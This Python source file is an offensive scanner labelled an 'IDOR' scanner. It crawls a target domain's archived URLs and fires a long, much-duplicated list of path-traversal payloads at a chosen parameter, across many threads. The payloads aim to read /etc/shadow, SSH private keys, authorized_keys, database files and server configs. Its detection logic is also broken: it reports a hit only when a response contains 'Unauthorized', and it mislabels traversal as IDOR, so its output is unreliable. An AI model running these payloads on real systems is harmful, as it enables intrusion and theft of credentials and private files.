import threading
import requests
import argparse
import sys
import numpy as np
from concurrent.futures import ThreadPoolExecutor
from jinja2 import Environment, FileSystemLoader
import sqlite3
import signal

requests.packages.urllib3.disable_warnings()

GREEN, RED, WHITE, YELLOW, MAGENTA, BLUE, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def get_arguments():
        parser = argparse.ArgumentParser(description=f'{RED}Advance IDOR Vulnerability Scanner')
        parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
        parser.add_argument("-t", "--thread", dest="thread", help="Number of Threads to Use. Default=50", default=50)
        parser.add_argument("-o", "--output", dest="output", help="Save Vulnerable URLs in TXT file")
        parser.add_argument("-s", "--subs", dest="want_subdomain", help="Include Results of Subdomains", action='store_true')
        parser.add_argument("--deepcrawl", dest="deepcrawl", help="Use All Available APIs of CommonCrawl for Crawling URLs [**Takes Time**]", action='store_true')
        parser.add_argument("--report", dest="report_file", help="Generate an HTML report", default=None)

        required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
        required_arguments.add_argument("-l", "--list", dest="url_list", help="URLs List, e.g., google_urls.txt")
        required_arguments.add_argument("-d", "--domain", dest="domain", help="Target Domain Name, e.g., testphp.vulnweb.com")
        required_arguments.add_argument("-p", "--parameter", dest="parameter", help="Vulnerable parameter to manipulate (e.g., user_id)")
        return parser.parse_args()

def readTargetFromFile(filepath):
        urls_set = set()
        with open(filepath, "r") as f:
            for urls in f.readlines():
                url = urls.strip()
                if url:
                    urls_set.add(url)
        return list(urls_set)

custom_idor_payloads = [
        "../../../../../etc/passwd",
        "../../../admin/config.txt",
        "../../../../private/secrets",
        "../../../backup/database.bak",
        "../../../../../windows/win.ini",
        "../../../user/profile.jpg",
        "../../../../../../.ssh/id_rsa",
        "../../../../../var/www/index.php",
        "../../../../../../../etc/shadow",
        "../../../logs/access.log",
        "../../../../../../etc/hostname",
        "../../../../../../etc/ssh/ssh_host_rsa_key",
        "../../../../../../../../../usr/local/apache2/conf/httpd.conf",
        "../../../etc/crontab",
        "../../../../../../../../../../root/.ssh/authorized_keys",
        "../../../../../../../../../etc/nginx/nginx.conf",
        "../../../webroot/backup.sql",
        "../../../../../../../../../etc/my.cnf",
        "../../../../../../../etc/tomcat/server.xml",
        "../../../images/backup.zip",
        "../../../../../../../etc/nginx/conf.d/default.conf",
        "../../../../../../../../../usr/local/tomcat/conf/server.xml",
        "../../../application/logs/error.log",
        "../../../../../../../../../etc/nginx/sites-available/default",
        "../../../documents/confidential.docx",
        "../../../../../../../../../etc/hosts",
        "../../../../../../../../../var/lib/mysql/mysql/user.MYD",
        "../../../../../../../etc/httpd/conf/httpd.conf",
        "../../../backups/db_backup.sql",
        "../../../../../../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../admin/config.txt",
        "../../../private/secrets",
        "../../../backup/database.bak",
        "../../../../../windows/win.ini",
        "../../../user/profile.jpg",
        "../../../../.ssh/id_rsa",
        "../../../../../var/www/index.php",
        "../../../../../../etc/shadow",
        "../../../logs/access.log",
        "../../../../../../etc/hostname",
        "../../../../../../etc/ssh/ssh_host_rsa_key",
        "../../../../../../../../../usr/local/apache2/conf/httpd.conf",
        "../../../etc/crontab",
        "../../../../../../../../root/.ssh/authorized_keys",
        "../../../../../../../../../etc/nginx/nginx.conf",
        "../../../webroot/backup.sql",
        "../../../../../../../../../etc/my.cnf",
        "../../../../../../etc/tomcat/server.xml",
        "../../../images/backup.zip",
        "../../../../../../etc/nginx/conf.d/default.conf",
        "../../../../../../../../../usr/local/tomcat/conf/server.xml",
        "../../../application/logs/error.log",
        "../../../../../../../../../etc/nginx/sites-available/default",
        "../../../documents/confidential.docx",
        "../../../../../../../../../etc/hosts",
        "../../../../../../../../../var/lib/mysql/mysql/user.MYD",
        "../../../../../etc/httpd/conf/httpd.conf",
        "../../../backups/db_backup.sql",
        "../../../config/config.yaml",
        "../../../../../etc/ssh/ssh_config",
        "../../../../../../../../etc/security/access.conf",
        "../../../../../../../etc/apache2/apache2.conf",
        "../../../../../etc/postfix/main.cf",
        "../../../../../../../../etc/security/access.conf",
        "../../../../../../etc/cron.d/crontab",
        "../../../../../../etc/postfix/main.cf",
        "../../../../../etc/hosts.allow",
        "../../../../etc/apache2/sites-available/000-default.conf",
        "../../../../../etc/hosts.deny",
        "../../../../etc/apache2/sites-available/default-ssl.conf",
        "../../../../etc/apache2/sites-available/000-default.conf",
        "../../../../../etc/fstab",
        "../../../../etc/apache2/sites-available/default-ssl.conf",
        "../../../../etc/apache2/sites-available/000-default.conf",
        "../../../../../etc/network/interfaces",
        "../../../../etc/mysql/my.cnf",
        "../../../../../etc/security/access.conf",
        "../../../../etc/mysql/mariadb.conf.d/50-server.cnf"
        # Add your 30 custom payloads here
]

class PassiveCrawl:
    def __init__(self, domain, want_subdomain, threadNumber, deepcrawl):
        self.domain = domain
        self.want_subdomain = want_subdomain
        self.deepcrawl = deepcrawl
        self.threadNumber = threadNumber
        self.final_url_list = set()

    def start(self):
        if self.deepcrawl:
            self.startDeepCommonCrawl()
        else:
            self.getCommonCrawlURLs(self.domain, self.want_subdomain, ["http://index.commoncrawl.org/CC-MAIN-2018-22-index"])

        urls_list1 = self.getWaybackURLs(self.domain, self.want_subdomain)
        urls_list2 = self.getOTX_URLs(self.domain)

        self.final_url_list.update(urls_list1)
        self.final_url_list.update(urls_list2)

        return list(self.final_url_list)
    
    def getIdealDomain(self, domainName):
        final_domain = domainName.replace("http://", "")
        final_domain = final_domain.replace("https://", "")
        final_domain = final_domain.replace("/", "")
        final_domain = final_domain.replace("www", "")
        return final_domain

    def split_list(self, list_name, total_part_num):
        final_list = []
        split = np.array_split(list_name, total_part_num)
        for array in split:
            final_list.append(list(array))
        return final_list

    def make_GET_Request(self, url, response_type):
        response = requests.get(url)
        if response_type.lower() == "json":
            result = response.json()
        else:
            result = response.text
        return result

    def getWaybackURLs(self, domain, want_subdomain):
        if want_subdomain == True:
            wild_card = "*."
        else:
            wild_card = ""

        url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
        urls_list = self.make_GET_Request(url, "json")
        try:
            urls_list.pop(0)
        except:
            pass

        final_urls_list = set()
        for url in urls_list:
            final_urls_list.add(url[0])

        return list(final_urls_list)

    def getOTX_URLs(self, domain):
        url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
        raw_urls = self.make_GET_Request(url, "json")
        urls_list = raw_urls["url_list"]

        final_urls_list = set()
        for url in urls_list:
            final_urls_list.add(url["url"])

        return list(final_urls_list)

    def startDeepCommonCrawl(self):
        api_list = self.get_all_api_CommonCrawl()
        collection_of_api_list = self.split_list(api_list, int(self.threadNumber))

        thread_list = []
        for thread_num in range(int(self.threadNumber)):
            t = threading.Thread(target=self.getCommonCrawlURLs, args=(self.domain, self.want_subdomain, collection_of_api_list[thread_num],))
            thread_list.append(t)

        for thread in thread_list:
            thread.start()
        for thread in thread_list:
            thread.join()

    def get_all_api_CommonCrawl(self):
        url = "http://index.commoncrawl.org/collinfo.json"
        raw_api = self.make_GET_Request(url, "json")
        final_api_list = []

        for items in raw_api:
            final_api_list.append(items["cdx-api"])

        return final_api_list

    def getCommonCrawlURLs(self, domain, want_subdomain, apiList):
        if want_subdomain == True:
            wild_card = "*."
        else:
            wild_card = ""

        final_urls_list = set()

        for api in apiList:
            url = f"{api}?url={wild_card+domain}/*&fl=url"
            raw_urls = self.make_GET_Request(url, "text")

            if ("No Captures found for:" not in raw_urls) and ("<title>" not in raw_urls):
                urls_list = raw_urls.split("\n")

                for url in urls_list:
                    if url != "":
                        final_urls_list.add(url)

        return list(final_urls_list)

class IDORScanner:
    def __init__(self, url_list, parameter, threadNumber, report_file):
        self.url_list = url_list
        self.parameter = parameter
        self.threadNumber = threadNumber
        self.vulnerable_urls = []
        self.report_file = report_file
        self.stop_scan = False
        self.reported_urls = set()  # Store reported URLs
        signal.signal(signal.SIGINT, self.handle_ctrl_c)

    def handle_ctrl_c(self, signum, frame):
        print("Ctrl+C detected. Stopping the scan.")
        self.stop_scan = True

    def start(self):
        print("[>>] [Scanning for IDOR vulnerabilities]")
        print("=========================================================================")

        self.url_list = list(set(self.url_list))

        with ThreadPoolExecutor(max_workers=int(self.threadNumber)) as executor:
            results = list(executor.map(self.scan_urls_for_idor, self.url_list))

        self.vulnerable_urls = [url for sublist in results for url in sublist]

        if self.report_file:
            self.store_vulnerabilities_in_sqlite()
            self.generate_report()

        return self.vulnerable_urls

    def test_idor_vulnerabilities(self, url, parameter):
        vulnerable_urls = []
        if self.stop_scan:
            return vulnerable_urls

        for payload in custom_idor_payloads:
            target_url = f"{url}?{parameter}={payload}"

            try:
                response = requests.get(target_url, verify=False, timeout=10)
                if self.stop_scan:
                    return vulnerable_urls

                if response.status_code == 200:
                    if "Unauthorized" in response.text:
                        # Check if the URL has already been reported
                        if target_url not in self.reported_urls:
                            print(f"IDOR vulnerability found in URL: {url}")
                            self.reported_urls.add(target_url)
                            vulnerable_urls.append(url)
            except Exception as e:
                pass

        return vulnerable_urls

    def store_vulnerabilities_in_sqlite(self):
        conn = sqlite3.connect("idor_vulnerabilities.db")
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS vulnerabilities (url TEXT)")
        conn.commit()

        for url in self.vulnerable_urls:
            cursor.execute("INSERT INTO vulnerabilities (url) VALUES (?)", (url,))
            conn.commit()

        conn.close()

    def generate_report(self):
        env = Environment(loader=FileSystemLoader('.'))
        template = env.get_template('report_template.html')
        report_content = template.render(vulnerable_urls=self.vulnerable_urls)

        with open(self.report_file, "w") as f:
            f.write(report_content)

    def scan_urls_for_idor(self, url):
        if self.stop_scan:
            return []

        # Keep track of unique URLs
        unique_urls = set()

        vulnerable_urls = []
        for payload in custom_idor_payloads:
            target_url = f"{url}?{self.parameter}={payload}"

            try:
                response = requests.get(target_url, verify=False, timeout=10)
                if self.stop_scan:
                    return vulnerable_urls

                if response.status_code == 200:
                    if "Unauthorized" in response.text:
                        # Check if we haven't already seen this URL
                        if target_url not in unique_urls:
                            print(f"IDOR vulnerability found in URL: {url}")
                            unique_urls.add(target_url)  # Mark the URL as seen
                            vulnerable_urls.append(url)
            except Exception as e:
                pass

        return vulnerable_urls

if __name__ == '__main__':
    arguments = get_arguments()

    if arguments.domain:
        print("=========================================================================")
        print("[>>] Crawling URLs from: WaybackMachine, AlienVault OTX, CommonCrawl ...")
        crawl = PassiveCrawl(arguments.domain, arguments.want_subdomain, arguments.thread, arguments.deepcrawl)
        final_url_list = crawl.start()

    elif arguments.url_list:
        final_url_list = readTargetFromFile(arguments.url_list)

    else:
        print("[!] Please Specify --domain or --list flag ..")
        print(f"[*] Type: {sys.argv[0]} --help")
        sys.exit()

    print("=========================================================================")
    print("[>>] [Total URLs] : ", len(final_url_list))

    scan = IDORScanner(final_url_list, arguments.parameter, arguments.thread, arguments.report_file)
    vulnerable_urls = scan.start()

    print("=========================================================================")
    for url in vulnerable_urls:
        print(url)
    print("\n[>>] [Total IDOR Vulnerabilities Found]:", len(vulnerable_urls))
